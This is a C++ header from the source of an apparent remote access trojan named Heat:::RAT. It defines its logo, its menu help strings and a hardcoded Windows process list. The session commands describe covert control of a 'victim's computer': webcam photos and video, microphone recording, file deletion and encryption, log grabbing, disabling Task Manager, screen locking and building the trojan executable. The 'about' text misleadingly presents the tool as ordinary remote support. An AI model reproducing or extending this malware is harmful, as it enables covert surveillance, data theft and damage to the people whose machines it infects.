#pragma once
#include "main.h"

namespace Modules 
{
	extern inline std::string logo = R"LOGO(##########################################################################################################################
#....######....##.............######.....###...............####################.............######......###..............#
#....######....##.............#####.......##...............#.######.######.####..............#####.......##..............#
#..............##.....############.........######....#####.....##.....##.....##....#####.....####.........######....######
#..............##.............###.....#.....#####.....####.....##.....##.....##.............####.....#....######....######
#..............##.............###............####.....#########################...........#####............#####....######
#....######....##.....##########..............###.....########################....##.......##..............#####....######
#....#####.....##..............................##.....####.....##.....##.....##....####......................###....######
#....######....##..................#######.....##.....####.....##.....##.....##....#####..........#######....###....######
##########################################################################################################################)LOGO";

	extern inline string commands_menu = R"context(                                               commands available in menu
========================================================================================================================
command = "!help"
using for: show a list of all available commands in menu

========================================================================================================================
command = "!close"
using for: exit app

========================================================================================================================
command = "!preferences"
using for: transition to the preferences tab

========================================================================================================================
command = "!ports"
using for: transition to the ports preferences tab

========================================================================================================================
command = "!github"
using for: open the creator page in GitHub in the browser

========================================================================================================================
command = "!build"
using for: build the .exe file of the rat virus

========================================================================================================================
command = "!sessions"
using for: transition to the tab with all opened sessions

========================================================================================================================
command = "!logs"
using for: show a list of all saved logs

========================================================================================================================
command = "!about"
using for: all about app

========================================================================================================================)context";

	extern inline string about = R"context(                                                                 about
========================================================================================================================
Heat:::RAT allows a user to remotely access a computer or device from another location, over the internet.

The program connects the two computers using encryption technologies to protect sensitive data and prevent unauthorized access.
Once the connection is established, the user can access and control the remote computer or device as
if they were physically present at that location.

Programs include features such as file transfer, remote printing, and the ability to share screens with other users.
They can be used for a variety of purposes, including remote technical support, remote collaboration,
and accessing files or software that are only available on a specific computer or device.

Creator (https://github.com/Nick-Vinesmoke)
Language Cpp
========================================================================================================================)context";

	extern inline string commands_port = R"context(                                               commands available in ports
========================================================================================================================
command = "!help"
using for: show a list of all available commands in preferences

========================================================================================================================
command = "!menu"
using for: return to the menu

========================================================================================================================
command = "!open"
using for: open port

========================================================================================================================
command = "!close"
using for: close port

========================================================================================================================
command = "!closeAll"
using for: close all

========================================================================================================================
command = "!ports"
using for: show open ports

========================================================================================================================
command = "!test"
using for: test open ports

========================================================================================================================)context";

	extern inline string commands_preferences = R"context(                                           commands available in preferences
========================================================================================================================
command = "!help"
using for: show a list of all available commands in preferences

========================================================================================================================
command = "!menu"
using for: return to the menu

========================================================================================================================
command = "!network"
using for: test your network speed

========================================================================================================================
command = "!reset"
using for: reset all

========================================================================================================================
command = "!update"
using for: check for update

========================================================================================================================
command = "!errors"
using for: show errors

========================================================================================================================
command = "!experimentalMode"
using for: turn on the experimental mode

========================================================================================================================)context";

	extern inline string commands_sessions = R"context(                                             commands available in sessions
========================================================================================================================
command = "!help"
using for: show a list of all available commands in preferences

========================================================================================================================
command = "!menu"
using for: return to the menu

========================================================================================================================
command = "!open"
using for: manual session opening (unstable)

========================================================================================================================
command = "!close"
using for: close session

========================================================================================================================
command = "!closeAll"
using for: return to the menu

========================================================================================================================
command = "!test"
using for: test connection to sessions

========================================================================================================================
command = "!choose"
using for: choose a section for future work

========================================================================================================================)context";

	extern inline string commands_session = R"context(                                             commands available in session
========================================================================================================================
command = "!help"
using for: show a list of all available commands in preferences

========================================================================================================================
command = "!menu"
using for: return to the menu

========================================================================================================================
command = "!screenshot"
using to : do a screenshot and sent to you

========================================================================================================================
command = "!photoWebcam"
using to : do a photo from the webcam and sent to you

========================================================================================================================
command = "!openLink"
using to : open the link on the victim's computer

========================================================================================================================
command = "!directory"
using for: get a path to rat virus

========================================================================================================================
command = "!directoryContent"
using for: get all files name placed in the same directory with virus

========================================================================================================================
command = "!createFolder"
using for: create a folder on the victim's computer

========================================================================================================================
command = "!deleteFolder"
using for: delete a folder on the victim's computer

========================================================================================================================
command = "!deleteFile"
using for: delete a file on the victim's computer

========================================================================================================================
command = "!downloadFile"
using for: download the file to the victim's computer

========================================================================================================================
command = "!video"
using for: rec the video from the victim's webcam, duration in seconds

========================================================================================================================
command = "!audio"
using for: rec the audio from the victim's microphone, duration in seconds

========================================================================================================================
command = "!runFile"
using for: run the file on the victim's computer

========================================================================================================================
command = "!volume"
using for: change the volume on the victim's computer

========================================================================================================================
command = "!turnOff"
using for: shutdown the victim's computer

========================================================================================================================
command = "!restart"
using for: restart the victim's computer

========================================================================================================================
command = "!alt+f4"
using for: alt+f4 =)

========================================================================================================================
command = "!crazyCursor"
using for: change mouse buttons

========================================================================================================================
command = "!wallpaper"
using for: change the wallpaper on the victim's compute

========================================================================================================================
command = "!move"
using for: move the virus to the directory

========================================================================================================================
command = "!rename"
using for: rename the virus

========================================================================================================================
command = "!encrypt"
using for: encrypt file on the victim's computer

========================================================================================================================
command = "!decrypt"
using for: decrypt file on the victim's computer

========================================================================================================================
command = "!logs"
using for: grab and send logs from the victim's computer

========================================================================================================================
command = "!screamer"
using for: screamer :O

========================================================================================================================
command = "!moveFile"
using for: move the file to the directory on victim's computer

========================================================================================================================
command = "!lock"
using for: #winlock ('._.')

========================================================================================================================
command = "!downloadFolder"
using for: download folder to the victim's computer

========================================================================================================================
command = "!processes"
using for: show process list

========================================================================================================================
command = "!closeProces"
using for: close process

========================================================================================================================
command = "!banTM"
using for: ban task manager

========================================================================================================================
command = "!message"
using for: show text message

========================================================================================================================
command = "!CMDbomb"
using for: booom

========================================================================================================================)context";

	extern inline string curentUSER;
	extern inline string space = "          ";
	extern inline string logs = "EMPTY";
	extern inline string prefrences = "resources\\ports.txt";
	extern inline string user = "resources\\users.txt";
	extern inline string proc = R"context(System Idle Process
		System
		Registry
		smss.exe
		csrss.exe
		wininit.exe
		csrss.exe
		services.exe
		lsass.exe
		winlogon.exe
		svchost.exe
		fontdrvhost.exe
		fontdrvhost.exe
		svchost.exe
		svchost.exe
		dwm.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		NVDisplay.Container.exe
		atiesrxx.exe
		amdfendrsr.exe
		AsusCertService.exe
		NVDisplay.Container.exe
		svchost.exe
		svchost.exe
		WmiPrvSE.exe
		svchost.exe
		svchost.exe
		svchost.exe
		wsc_proxy.exe
		svchost.exe
		atieclxx.exe
		Memory Compression
		svchost.exe
		svchost.exe
		WmiPrvSE.exe
		sihost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		svchost.exe
		AsusOptimization.exe
		svchost.exe
		wlanext.exe
		AvastSvc.exe
		conhost.exe
		AsusOptimizationStartupTask.exe
		aswToolsSvc.exe
		spoolsv.exe
		svchost.exe
		svchost.exe
		aswEngSrv.exe
		ArmouryCrateControlInterface.exe
		ArmouryCrate.Service.exe
		armsvc.exe
		AnyDesk.exe
		AsusLinkNear.exe
		svchost.exe
		AsusLinkRemote.exe
		LightingService.exe
		AsusAppService.exe
		AsusSwitch.exe
		AsusSystemAnalysis.exe
		svchost.exe
		ElevationService.exe
		svchost.exe
		GameSDK.exe
		MailRuUpdater.exe
		AsusSoftwareManager.exe
		ROGLiveService.exe
		service_update.exe
		svchost.exe
		svchost.exe
		AsusSystemDiagnosis.exe
		nvcontainer.exe
		svchost.exe
		TeamViewer_Service.exe
		service_update.exe
		svchost.exe
		svchost.exe
		ArmouryCrate.UserSessionHelper.exe
		svchost.exe
		rundll32.exe
		svchost.exe
		svchost.exe
		nvcontainer.exe
		svchost.exe
		svchost.exe
		aswidsagent.exe
		conhost.exe
		nvcontainer.exe
		AcPowerNotification.exe
		taskhostw.exe
		ArmourySocketServer.exe
		svchost.exe
		ctfmon.exe
		svchost.exe
		asus_framework.exe
		NVIDIA Web Helper.exe
		explorer.exe
		conhost.exe
		GoogleCrashHandler.exe
		GoogleCrashHandler64.exe
		svchost.exe
		svchost.exe
		svchost.exe
		taskhostw.exe
		svchost.exe
		asus_framework.exe
		unsecapp.exe
		svchost.exe
		ArmourySwAgent.exe
		TrustedInstaller.exe
		TiWorker.exe
		StartMenuExperienceHost.exe
		RuntimeBroker.exe
		SearchIndexer.exe
		SearchApp.exe
		RuntimeBroker.exe
		svchost.exe
		ArmouryCrate.exe
		svchost.exe
		RuntimeBroker.exe
		ArmouryCrate.DenoiseAI.exe
		LockApp.exe
		RuntimeBroker.exe
		PhoneExperienceHost.exe
		nvsphelper64.exe
		NVIDIA Share.exe
		NVIDIA Share.exe
		NVIDIA Share.exe
		RuntimeBroker.exe
		RuntimeBroker.exe
		svchost.exe
		smartscreen.exe
		SecurityHealthSystray.exe
		SecurityHealthService.exe
		AvastUI.exe
		AutoConnectHelper.exe
		svchost.exe
		RadeonSoftware.exe
		jusched.exe
		svchost.exe
		cncmd.exe
		ACCIMonitor.exe
		Kotatogram.exe
		AvastUI.exe
		AvastUI.exe
		AvastUI.exe
		backgroundTaskHost.exe
		backgroundTaskHost.exe
		backgroundTaskHost.exe
		backgroundTaskHost.exe
		svchost.exe
		svchost.exe
		RuntimeBroker.exe
		svchost.exe
		RuntimeBroker.exe
		RuntimeBroker.exe
		svchost.exe
		AsusSoftwareManagerAgent.exe
		svchost.exe
		svchost.exe
		svchost.exe
		MicrosoftEdgeUpdate.exe
		GoogleUpdate.exe
		GoogleUpdate.exe
		SgrmBroker.exe
		sppsvc.exe
		svchost.exe
		svchost.exe
		MoUsoCoreWorker.exe
		svchost.exe
		svchost.exe
		winHost.exe)context";

}
//R"context()context"
